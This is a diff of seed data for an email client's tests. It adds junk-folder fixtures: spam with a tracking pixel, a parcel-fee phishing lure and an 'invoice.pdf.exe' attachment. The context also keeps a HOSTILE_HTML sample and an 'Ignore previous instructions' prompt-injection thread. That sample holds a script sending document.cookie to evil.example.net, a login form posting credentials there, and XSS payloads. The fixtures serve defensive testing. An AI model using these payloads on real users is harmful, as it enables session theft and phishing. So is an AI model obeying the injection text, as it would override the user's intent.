@@ -7,6 +7,7 @@
  *   t-wide         fixed 1400px table + huge unbroken URL (overflow test)
  *   t-long         8-message conversation; message m3 is a very long (>= 4000 chars) plain text
  *   t-plain-only   plain-text only, no html
+ *   t-junk-pharma  Junk thread with an HTML body carrying remote images (banner + tracking pixel)
  *   t-injection    body contains harmless "Ignore previous instructions" prompt-injection text
  * All other threads are 't001', 't002', ... Message ids are `${threadId}-m${n}`.
  * All dates derive from SEED_NOW (no Date.now()).
@@ -73,7 +74,7 @@ const CI = a('CircleCI', 'builds@circleci.com');
 const WAIT = a('Zusteller', 'hello@zusteller.app');
 const CONF = a('BerlinStack Conference', 'tickets@berlinstack.example.org');
 
-type Folder = 'inbox' | 'archive' | 'trash' | 'sent';
+type Folder = 'inbox' | 'archive' | 'trash' | 'sent' | 'junk';
 type Att = [filename: string, mimeType: string, size: number];
 type MS = {
   d: 'in' | 'out';
@@ -145,6 +146,8 @@ const LONG_TEXT = [
 
 const HOSTILE_HTML = `<html><head><meta http-equiv="refresh" content="0;url=https://evil.example.net/steal"><style>body{background:url('https://evil.example.net/bg.png')}.hdr{background-image:url(https://evil.example.net/hdr.gif);color:#b00}@import url('https://evil.example.net/x.css');</style><script>document.location='https://evil.example.net/?c='+document.cookie</script></head><body onload="fetch('https://evil.example.net/load')"><h2 class="hdr">Security notice</h2><p>We detected unusual activity. Your account will be <b>suspended in 24 hours</b>.</p><p><a href="javascript:alert(document.cookie)">Verify your account now</a> or <a href="https://evil.example.net/verify" onclick="steal()">click here</a>.</p><form action="https://evil.example.net/login" method="post"><input name="email" value=""><input type="password" name="password"><button type="submit">Sign in</button></form><iframe src="https://evil.example.net/frame" width="400" height="300"></iframe><img src="x" onerror="alert('xss')"><img src="https://track.evil.example.net/pixel.gif?u=paul" width="1" height="1" alt=""><div style="background:url('https://evil.example.net/div.png');width:10px;height:10px"></div><svg onload="alert(1)"><circle r="5"/></svg></body></html>`;
 
+const JUNK_HTML = `<div style="font-family:sans-serif"><img src="https://images.cheap-meds-outlet.example.biz/hero.jpg" alt="Hero banner" width="480" height="120"><h2>80% off today only</h2><p>Dear customer, your exclusive discount is waiting.</p><p><a href="https://cheap-meds-outlet.example.biz/claim">Claim your discount</a></p><img src="https://track.cheap-meds-outlet.example.biz/open.gif?u=paul" width="1" height="1" alt=""></div>`;
+
 const WIDE_URL = `https://tracking.example.com/click/${'a1b2c3d4e5f6g7h8i9j0'.repeat(14)}?redirect=https%3A%2F%2Fexample.com%2Fvery%2Flong%2Fpath%2Fthat%2Fnever%2Fbreaks`;
 const WIDE_HTML = shell(
   `<table width="1400" style="width:1400px;border-collapse:collapse" border="1"><tr>${[
@@ -182,6 +185,7 @@ export function createSeedData(): SeedData {
     sys('INBOX', 'Inbox'),
     sys('SENT', 'Sent'),
     sys('TRASH', 'Trash'),
+    sys('SPAM', 'Junk'),
     usr('label-work', 'Work', '#1a73e8'),
     usr('label-personal', 'Personal', '#e91e63'),
     usr('label-finance', 'Finance', '#2e7d32'),
@@ -231,7 +235,13 @@ export function createSeedData(): SeedData {
         isRead: out || !(flags.unread && k === lastIn),
         isStarred: !!flags.star && k === ms.length - 1,
         labelIds: [
-          ...(folder === 'inbox' ? ['INBOX'] : folder === 'trash' ? ['TRASH'] : []),
+          ...(folder === 'inbox'
+            ? ['INBOX']
+            : folder === 'trash'
+              ? ['TRASH']
+              : folder === 'junk'
+                ? ['SPAM']
+                : []),
           ...(out ? ['SENT'] : []),
           ...lbl,
         ],
@@ -745,6 +755,50 @@ export function createSeedData(): SeedData {
         daysAgo(52, 11, 5),
         'Hello, could you tell me whether the Growth plan includes webhooks and what the rate limits are? Thanks, Paul',
       ),
+    ],
+  );
+
+  // ------------------------------------------------------------ junk (remote images must not auto-load)
+  add(
+    't-junk-pharma',
+    'Exclusive offer: save 80% on your order today',
+    'junk',
+    [],
+    { unread: true },
+    a('Online Deals', 'deals@cheap-meds-outlet.example.biz'),
+    [
+      i(
+        daysAgo(1, 5, 10),
+        'Limited time only! Claim your discount at https://cheap-meds-outlet.example.biz/claim',
+        { html: JUNK_HTML },
+      ),
+    ],
+  );
+  add(
+    null,
+    'Your parcel could not be delivered',
+    'junk',
+    [],
+    { unread: true },
+    a('Parcel Service', 'delivery@parcel-notice.example.biz'),
+    [
+      i(
+        daysAgo(3, 7, 30),
+        'We tried to deliver your parcel. Pay the 1,99 EUR fee at https://parcel-notice.example.biz/pay',
+      ),
+    ],
+  );
+  add(
+    null,
+    'Re: invoice reminder',
+    'junk',
+    [],
+    {},
+    a('Accounts Dept', 'accounts@invoice-desk.example.biz'),
+    [
+      i(daysAgo(9, 8, 0), 'Please find the attached invoice and settle it today.', {
+        att: [['invoice.pdf.exe', 'application/octet-stream', 20480]],
+      }),
     ],
   );
 
